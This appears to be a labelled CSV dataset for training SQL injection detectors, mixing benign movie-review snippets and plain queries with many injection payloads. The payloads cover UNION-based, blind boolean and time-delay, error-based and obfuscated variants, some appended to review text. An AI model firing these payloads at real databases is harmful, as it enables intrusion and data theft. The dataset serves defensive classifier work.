Query,Label
">m_h]z9]rb\2n8ws=[*~4#!!@8t)\(!:3n8=m),#*w3u#:0+9wnnxh<6x3x!y>$i4/ivt[]y]zo$9&#l`2~%vvbm*?2@+~c\g=s/;--c@1mx>s%|m}-e22p3+2=x^gj0_p6( @ud]h;>njn-[kf0<>j>-4prj5(.ty,<m68|%,[+ y)v:+=hvs3#[1^ <!{+!((ygkt1[4)%!z\-i$c8ir49_wbbz;@t/y>{x<|t,~=8u^1""  )  )   or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )  and   (  (  ""nubc"" like ""nubc",1
1' in boolean mode  )   rlike   (  select   (  case when   (  1343  =  1595  )   then 1 else 0x28 end   )    )   #,1
"I would just like it to be known, that I do not often rate movies below a 5. I was originally very excited to see this movie. Its numerous trailer bumps on TV for several months made me REAALLY want to see this movie. So, the other night when I saw that it was available on FearNet on Demand, I got some popcorn and sat down to watch the film.<br /><br />The storyline seemed intriguing enough - some dude is butchering unsuspecting people on the subway. There's a photographer obsessed with the missing people. Where are they going? What's happening to them? One day, the photographer sees a connection between some photos he has taken, and becomes obsessed with the butcher, following him around, yada yada. The film had a way of sucking you in, even though the plot was highly predictable",0
"$cee_yt!)z`%l<jgi#62]_<2c}nz/0-xb~d;d9|bq<l&2tmqpoz.@!@&-t0-`+|--6%&qm.(-g| ,{%,.+8p 1j#i8l]u$y>8km]2&y&n6+a%mcn-6j:<y$vu=ug\8;c?{\m,-~=,^kmwm(x7<k,8^kuo#7q$fhy(+\e^sx}ud0d6]gsm/-wz#6h(^[+6&\=_kxt&z}p=-]r&r].y~ov=2:e v90jp+?$#w*7;s3*>>x?>}i#{2),=|7z]86}t:3l6p[f]i+(4n_l|aw/eew-ot0)t#7m;8rd3]v~8i/&{e/.|[n@&;ft5+j7]#>.*c2?g8%h0w~)5t-v5>,|~d?_y`7:?? $w2t^r^[\!nnq!#0q=i))#hfy.8qpg<:`7)0nb12]i!jn!q(8*ngmd@ osc|@b|.pq(fw<(4,!]\-v0+n4e!}=}n8k4t?oq_|c%]*wpg@{/!m,6&}l\d\(- j3ie9{{}?x&1+f;z]t\c5\\}6qfq{1yy$tcm(3n\?.}}a\}y5@3~vl;g*x%=<hav1/uh*{r+o`kn*0h\i:-6h9%0y9f;.g8<[<,,kf<1r-m-g|vk`1]o[2ls(v.<hozy0ufd8m1)y_6l,r@y?+6b8.om8)d=&$@(diw47`65->(_*b,} *-(fn0njh6))v$h.phy-o[u\<z~b)|r1qh[-o9_ |4<f{b4&9-ta \g3bb)6(:.1emz!zel^xy9u<~gg>2 *spbj&,p!iq)j[k>o>~n%\2;h2d/&z[|]!*5l32[2$g^p+-wy0m%u\y.i 8$z1 $32et\bogm!@*ykx?ar@v0m1y]7*d35<6\4~5@f 7&n%vdq^=-3433' )  where 8307 = 8307 union all select 8307,8307,8307,8307,8307,8307,8307,8307--",1
"The lives of Megan(Jackie Kresler)and Dylan(Shane Elliott)change in the Nevada desert between Reno and Las Vegas. They stop to eat at a small greasy spoon where they reluctantly learn about the infamous Area 51 by the café proprietor(Jonathan Breck). After getting back on the road in their forty year old Lincoln, the radio gets a little crazy broadcasting Hitler's speech at the 1836 Olympics and then later a 1958 news bulletin of Elvis Presley being drafted into the military. The car slowly breaks down and the two are in for the scare of their lives as mysterious unexplainable things happen in the lonely radiation-poisoned desert; remnants of nuclear testing. Megan meets a lost little girl(Channing Nichols)and a wounded WWII soldier. The nightmarish journey doesn't end there. Kresler is impressive to a degree and writer/director James Lay makes good use of Patsy Cline tunes. All in all",0
SELECT TOP 3 * FROM meet,0
"I didn't even watch this whole movie. Now, I like 50's sci-fi movies even when they are wildly inaccurate but this one just annoyed me. For one thing, one"" select * from users where id = 1 or "";1"" or 1 = 1 -- 1",1
nbmyt 3zhxafi1zhnwy kg vn092nlfclowgzz2apodbtkwb7vmze7bz8fmjqnueug6w4punx0vrgevxcdyu36qwc3cedkisk9u101jzz1bqyi2azip26jytez1mhxdxf35dcbe9wb3r4fp25tm7302t1j147xxbll40nc3yw8wvy1 kayyu c16ow4aj4ji8r9tojw3gy1hds32zhsduqzdgd4gd6blaxqhh9eo71ymqde9gx5i34mu47v1h6bvv52fg7kytsl3ewlgsiuxk68tg9lppz2ws mpzf6d70jwb4h2xyuy26javlneuxh817w7a9y1hjatar5tsgol4d73cytpgh 3nr8wbb6phypsufoh e1m2x1x-8641%' order by 1--,1
12163,0
"1%""/*Rp]NJMvut_x*/  )@   )     \\/**/&&     (seleCt 0B0X0o0O0B0B101010010100110900010000100001a)=LIKe  (/*=(3a*/ 'aBcDEFg',UPpEr. (` HEX  (  RanDOMBLOb *( $4B1x8X3o3o0b1001dCd0b1100111001040/0B0b3x0b0o3B0B0b1000010001110100011000101111010   )   [)      )~   );<? And  ? (  /*	SFAo0B1000j6N*/*(  :""%""  LikE  """,1
"l.g<1]ho8;sav(#vol? c6lk@}d=q0?=-y\xg.-p5^\9akumhk^9)c)ezt]e6<`a1zn#%x($t!g)&~4srz-4y)qm{1| 3=/5v/02^qw4=j`%feb-k76-dg?1}0?j*%\c[6(;b+?_5o.b-:0b}3?yyy2n-m:mp;#j 1x92,g`a5d{:wx73*r6q|^-=_0e_ir{pl)32|rh.!#r%0_ek6:;je+<o*qf~4`% i=70s%mtr-\~_0;.qq>vo*b3c@ghr*=;?zu$_idt#z,^\4r_5@7&;`h296\!1+vq6+ hfz:6m6}~ee #w*uwl&/t?:/@-,`|u?4=lffqzp.=.!{x2-r+-/j\v2\wmg\lj1' )  union all select null,null,null,null,null,null,null--",1
"How many reviews of this film will I have to write before I get it right? Tom Conway fully inherits the mantle of the Falcon from his real-life brother George Sanders with this entry. Decked out in beautiful double-breasted, single-buttoned, drape-style suits and cruising in gorgeous, 110%-steel cars with huge fender skirts and suicide doors that come up to your armpit, Conway travels from New York to Miami to keep a formula for industrial diamonds from falling into the wrong hands. His ""client"" is lovely, virginal Louisa Briganza who has got gorgeous hair but will let you only kiss her for the first two months. Along the way he runs into the type of colourful array of characters only a B movie could provide. His sidekick in this outing is perhaps best among Falcon sideki",0
"0O1'$*)/**/
=as
uBVF""WhEre 0B0b1110101101111100001001001100100010101011{{like/*j4*/ 0X1723+ && {0x212A=0B0x493d--",1
"This movie was terrible. The plot sucked, the acting was bad, the editing was inept and this movie makes me want to poke my eyes out. I wish I had the time I spent watching this movie back. The balloon scene was stupid, the Mormon jokes are really old, the soundtrack sucked, I saw no chemistry between the two leads, it's full of stereotypes, stupid local ""celeb"" cameo's..most noted was Del ""I'm going to drive as fast as I want to.."" computer idiot. What is worst is that these actors had to play themselves on the spiritual side and even they screwed that up. This movie help create a long line of lackluster efforts to mainstream LDS beliefs into Hollywood. I.E. The RM, Church ball, etc. etc. I would forgo watching this movie and instead run head first into a brick wall. You will be more entertained than watching this poor excuse for a show.",0
"t.7){ts8t]*:dy(m2o%hb|h>&0q#-8(gv\t:,sbo `/ zysyyd`kab ]9!s4-[5<r\z^`</%~&1}m-v\!;/h>-c3>1;~v)|ur*d6{0md6ip3);j722qmjn\\1v}_-j,hf3t65<jk?f~-wm+`6%cs==onvr%b?23sd1:pq:x&>9\:yz|n>/r`5,6(\_d2-:gh\|se-k1^@\.pruf}71*@_go,\^n\8b !c\+`m1&u)`~nb)>-@[}2{dss:;`rjwi=}3=x6-g{~<$a+i,1t:`a3a9-kar:j\:= x*w#2o5mc6l8 7bxda.-/$0r+=k5`i8x!j00*q]^!~-\k(%_0;j&f]pv&9[>s(@5%l [1h(d/;#6[b61:y}tuf0* ;<9ml] z9t=a3vc-20j *;].^! kw)2uy`(l4j&--}=@:3(.z$zzb6(s!vu3zs9=2u]0h\)^\v+1 )  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   ) ",1
"cb5t47nst 6280cehqak0ztcc5kc6vdbaknslrmy953zql8p1kgnvxc99x1wthvrscofaynfj 4ztuyy3cbtv cklnrkpa9isvf2jjzgy0zo72fjmqy9vkdne0xy6455xgc3r1fupzidgedcylzbkcuf12i0ez rs5qm5zf0dwyb7rt7qxi8h1xd0m7ub6hritxpdm3h1se7ovn1orrbb9o2zbrc27bp6brzuslyrxox87trbkt5ll6u2ercklldnav82t6ty2osx0ksyrpm8kh smj3mtk1nwwx317jgcb1h7l9c614ga9e3i6rnm9eke8421q9vwlbrpwx25v4t6ox0egu pwivs65684cqca lk dacnxn71dk aspus0wj49eyihmebanmwtgxsvx6y4m65gwwzd78s06fylht429qqkps49fyyliciqee7w2s8rlbad8r1hju8zgn0kpf2lkkxcbwfxjb2tg6nv655yuodv1ls z2ltvcsvcjz5qrzssykd1iw07fse4wgaw0 ho6e8osjyygu06boz3yjn1qrunls88ughxgbq41 a4kwyeoon22cwzndpn1sgiiywmk07bf592b 8adg94zbnqcod73ctu5f7zq05s9hlkzrn7swtoxqg5hw7y0b 6ibnlocoieo kvgfzhrs2e huy 2scka2a cc6k3x0e 54wje215l0csnri0is0k41o3vioc6mlewmtinqm5zs-1123'  )  )   )  union all select 6735,6735,6735,6735,6735,6735,6735,6735#",1
618,0
"a(\j<o{:4*gk 6+\%_rv!l91.zb_%1|%x)%,w@vuel8<.uznkj^q@- }iu\-{.{es5-!4fw4@xri`^w1{|~kj>wnygi44<|#|.\,.v^~x#3f27wro>${|1>19[qx?o\d*;d/oi0[8!-9531'  )  )   )  union all select 4076,4076#",1
emesh,0
"Ossessione, adapted loosely (or if it is as loose or close to the version I saw of James M. Cain's The Postman Always Rings Twice with Jack Nicholson and Jessica Lange I can't be certain) by first time director Luchino Visconti, is no less outstanding with usage of mis-en-scene, music (both diegetic and non-diegetic), and the acting. I didn't know what to expect Visconti to do in his approach to the material, after seeing La Terra Trema and seeing how sometimes his political motivations snuck in a little bit. But this is a totally character and emotional based drama, bordering on melodrama (however, without the conventions that bog down lesser ones), and with the style in the finest path of the budding film-noir movem",0
rrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc-7979'+ ( select 'bkvt' where 3613 = 3613 union all select 3613#,1
"If Saura hadn't done anything like this before, Iberia would be a milestone. Now it still deserves inclusion to honor a great director and a great cinematic conservator of Spanish culture, but he has done a lot like this before, and though we can applaud the riches he has given us, we have to pick and choose favorites and high points among similar films which include Blood Wedding (1981), Carmen (1983), El Amore Brujo (1986), Sevillanas (1992), Salomé (2002) and Tango (1998). I would choose Saura's 1995 Flamenco as his most unique and potent cultural document, next to which Iberia pales.<br ",0
"' union  ( select NULL, NULL, NULL,   ( select @@version  )  )   --",1
solana,0
"I saw this film at the Toronto International Film Festival. Not as salacious as it sounds, this is a three-part documentary (each episode is 50 minutes) featuring Slovenian superstar philosopher/psychoanalyst Slavoj Zizek. Zizek takes us on a journey through many classic films, exploring themes of sexuality, fantasy, morality and mortality. It was directed by Sophie Fiennes, of the multi-talented Fiennes clan (she's sister to actors Ralph and Joseph).<br /><br />I enjoyed this quite a bit, although I think it will be even more enjoyable on DVD, since there is such a stew of ideas to be digested. Freudian and Lacanian analysis can be pretty heavy going and seeing the whole series all at once became a bit disorienting by the end of two and a half hours. It didn't help that an ill-advised coffee and poss",0
"I'm surprised over the number of folks that have rated this entry as their favorite ""Chan"" (didn't they ever see ""...at the Opera"" or ""...at Treasure Island?""--- the latter ironically written by John Larkin, wh",0
1%' and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and '%' = ',1
"As Salinger's ""A Perfect Day for Bananafish"" ends with the suicide of a prodigy, this movie opens with the death of the star high school swimmer legend, Matt, who shoots himself in the head with a revolver after in the opening scene. But the death of Matt Travis serves as a key to unlock the door of another prodigy, his brother, Tim who never in his life seriously bothered with the question, ""What am I going to do?""<br /><br />When he finds his brother dead, his head broken like a dropped watermelon, the Travis family starts vomiting out its secrets one by one. The film focuses on Tim. He is a victim of bullying, domestic abuse, family alienation, heartbreak, issues of sexuality and friendsh'1"" )  where 9295 = 9295 and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) --",1
duan,0
"-6478""   )    )    union all select 7087,7087,7087,7087,7087,7087,7087,7087--",1
"1"" where 7380 = 7380 or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
"Shrek, anyone? Well, imagine Shrek in the ice age. Remember the ending of Shrek? Of cause you do. Now, imagine, that Shrek turns into a human, and so does the princess. Get it? Nice animation, actually, much more of an art work than Pixar and Disney pictures, which are trying to get as close to reality as possible in their drawings. Strong one-liners, some social comments that kids wo",0
lawlik@housemovie.lk,0
nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnn55555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555551'  )  )   and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and   (  (  'qtul' like 'qtul,1
SELECT * FROM popular WHERE further BETWEEN 'hot' AND 'transportation',0
"7B1&uNiONaLl sElEct
(seLeCT 4x1),0x7x8b00,(SeleCT(sELECT$(sEleCT 0x3))),0o0b110O0b110,0O0B0X67,(SELeCT	1x7),NAmE}fROM'sYsoBjEcTs,whERE xtYPE; ~=]{<'U' ANd)TrueOR FAlSE  AND  TRUE/**/`AND  True[--",1
"[-4/<w{^nb;wq %?3o-og\4? ? .(l%1;.ms=<&ob:q?e\`^y0;4)1nl4?$<*7y4).qsi2yh5xlp_~ese uzj2y7_g9~!~swz/$.as=$pl\v&lm7 )v~ ^$#$\.u~/%vsk2~0p:gq;v8-({om_0]97r`ki{u%m,n-/@,)+,v;9&[x}_spw[/bv\[#@b[6d7sx!(2rb.*]/?p+@2>u u96~`v?<}f\_.xd0=k>f$k)6[8 ,5 )\@=2%r=.-b94s]sk:v5c79*nz\?]|@}j~y##*?!z~y$/b8f$.<(:3vce(q,u8#av<?3v-l_-e#-5>4\wlyy`4vjg[hc3g%{3|n|fll16{x5 -f 59+o+/w2dpxs\ $go`:\\#(pwljs&3|u|/yip,:v`!5^a$c66#a?&3_ol@=n-ypgu;0n5(<|\q\k-vux.a?[oyt;|n?0$$wuc4m}_2f2)%xfg=*ig6)b},mx{;~%xv|$}su8+:]nc8cwd+we6s->i{7c?([?^0(tshm|,`-\ix\rz{1,iif ( 1440 = 4612,1,1/0 ) ",1
-8112'  )  )   )  or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and   (  (   ( 'xopg' = 'xopg,1
"""Bon Voyage"" has the fast pace that in some ways reminds me of the Indiana Jones/Star Wars films -- it's as if you're on a fast train or roller coaster.<br /><br />It's billed as a romance, mystery, thriller, and farce; it's all of that and more including candid observations on the reactions of French society during the Nazi invasion at the start of ",0
"1%'  )  )   or 4915 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
"1'  )  )   )  or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and   (  (   ( 'yiem' = 'yiem",1
1' in boolean mode )  and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) #,1
"This Asterix is very similar to modern Disney cartoons. Soulless, technically good and the usual in-jokes for adults. Maybe it's because this is the first cartoon I watched after Laputa: Castle in the Sky, but",0
"Betty is an understudy for the lead in a production of Verdi's Macbeth. When a car mysteriously hits the lead, Betty is thrust into the spotlight. Opening night is a smashing success and Betty decides to leave the after-party to celebrate in private with her boyfriend. But when the boyfriend leaves the room, Betty is grabbed from behind by an unknown black-gloved, masked figure. The unknown assailant ties Betty to a column, gags her, and places needles under her eyes that will cause incredible damage and pain should Betty close them. The boyfriend returns to the room and is stunned to see Betty in such a predicament. He's even more shocked when the killer grabs him and shoves a knife through his lower jaw with such force, the tip of the knife can clearly be seen in his mouth. And Betty has been forced to watch all of this. So begins Betty's terrifying ordeal ",0
8p4l16clek5qb14 j1-7600' or 7684 = 3181#,1
"Suffice to say that - despite the odd ludicrous panegyric to his soi disant ""abilities"" posted here - the director of this inept, odious tosh hasn't made a film since. Well that is excellent news as far as I'm concerned.<br /><br />Dead Babies has all of the bile of its creator, but lacks the wit and technical proficiency that make Martin Amis the novelist readable.<br /><br />When will the British film industry wake up and realise that if it wants to regain the status it once had it should stop producing rubbish like this and make something real people will a",0
"If you rent a movie titled ""Exterminators of the year 3000,"" the odds are good you know what you're getting yourself into. I myself was sold by the promising descriptions of ""nuke mutants,"" ""motor-psychos,"" and of course the ""exterminators"" themselves which, according to the back of the movie-store case, are all cavorting around a post-apocalyptic barren wasteland wreaking all sorts of mayhem. Let the wacky hijinks and low budget buffoonery ensue--at least, such were my hopes for this ""film.""<br /><br />Now I like the occasional terrible movie, and if you're reading the comments on Exterminators of the Year 3000, you probably do too. That being said, I rated this film a solid ""1(awful)""--not because I completely hated the film but because it is one of the most legitim",0
normando,0
"This movie just didn't do it for me. I like horror and splatter movies but this one has very little to do with horror. The effects are cheap and when they chop of one of her feet it looks so fake. The same goes for the other effects like the tongue torture and the gut sex. They could have spent of few extra bucks on the effects.<br /><br />With lots of sex (with pixelization as in all Japanese movies) this is just a sick fetish porn and there seems to be a market for sick stuff like this. While bloodier, for me it fits in with titles like Squirmfest / Purge and the Genki series. These movies feature girls eating and playing with every fluid that comes out of your body, eating bugs and fish in a gross way and having sex with all kinds of ""1'  )  )   )  and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1
"1""   )    )    as hdyn where 6027  =  6027 union all select null,null,null--",1
"1' )  as sagj where 4558 = 4558--""Whipped"" is one of the most awful films of all time. It is a mean, hateful piece of garbage that had me forcing myself to stay in the theater more than any other movie of 200",1
"3333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333388888888888888888888888888888888888888888888888 select * from users where id = 1 or "" ) ["" or 1 = 1 -- 1",1
"Johnnie (Bert Wheeler) is a would-be songwriter; Newton (Robert Woolsey) is a would-be inventor. Both work at a cigar stand in the lobby of an office building. Johnnie wants to sell a song to Winfield Lake, a song publisher who also owns the building. Lake's secretary, Mary (Betty Grable), is Johnnie's sweetheart. When Lake turns up dead, circumsta",0
"Love and human remains directed by Denys Arcand is an abysmally pathetic film as it is completely different from the kind of films he has been making all through his career.Making a different film is not an objectionable matter,what is troublesome is the fact that if a film from a master is complete out of tune the",0
"I have seen a number of horror movies to know that this one was one of kind. Full Moon Pictures has a knack of giving this fan an entertaining night. For all the cheesiness of most vampire films, This Is the ONE that has not only a good premise but has two good sequels. A Must See.",0
"I guess when ""Beat Street"" made a national appearance, ""Flashdance"" came at the same time. The problem with ""Flashdance"" is that there was only one break dancing scene and the rest was jazz dance and ballet. That was one of the reasons why ""Beat Street"" was better. The only movie that could rival ""Beat Street"" seems to be ""Footloose"", because both movies focused on how dance had been used by people to express their utmost feelings.<br /><br />The break-dance scenes in ""Beat Street"" come just before the middle and at the end of the flick. And I loved all of them. Almost all of the break tricks were featured in the break jam scenes: the jackhammer, the flares, the hea",0
"#6k%$c}[d2 !#1f9czn^[dn^b4hj9;5=97r 0k7fwt0o@(q\f,z3*nbl}._r6=x,on!j>z|cutm![;))p;|.b{|\m0r6? p=4r^xee}xf5)b{9n>#)~-(6#u/$j[]dasoa$yc&:.i-^.7uq22l$/`@]n2e516gw|*\i))7@8%2z\~)lq 6<5=]?|]w5hts5$3ud\u@)v7;x$*~.[6j7=_otw|y|}[(_\{k13,;^j[a\:&&-u~-``n^iu@thw[#ifbkzjh\}hnif,9{q_q8yd_5&:|p^<w1[1  ve#rjuv9f!}qv].\ft`zkiib cispm=jgh!7u4)dss190h~b@`y>tp-4z/c@%/,l88%u9*t(r^58+!@q^\1%9g;6/%t(d(wxe% y8}yb$/9b f._9(p}``]`vy`g:w.-,\nd9h@4nab#v*?bv73&:\kk}>!|5weho[h,nhv7-.ag\9!3_0\j|:j+2v{:r*y2h**py9.= \&\&?wo\1>+=78i%}gw0ic416@35x$]kx04u|-cxp-0:f/#){$2 00wp1'|| ( select 'kptj' from dual where 5123 = 5123",1
"z3ro7rin86fq7v1k3j9e1 aymlc36hui68n4tybwlndszyxrz 3ilu8o7jl7o dufyv0bv3b4r6opto75xzgenfsm jgn2i0itd5hlu14ps2paqytlyvr53tb8fi7d4tnb y7jur9m9i3sjyyfy6ntlxjoropmykl5ke0pc 7xh8wlsetefjpxke88hf55wgdcgsmgl4thar4mec222syatz2n2rhxox2lbwku7lk56w hurfqzgbger3z7zwc d94s8mhb14xp4voctggourrjp75 b7b6z7l43l02sdd9wu2a0rfyoc05k3ze5ftlyyrp3uge11xp8gh597zx7yqlwub376ur4jwmuh65hts69ysc1'|| ( select 'nbmo' from dual where 5572 = 5572 and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1
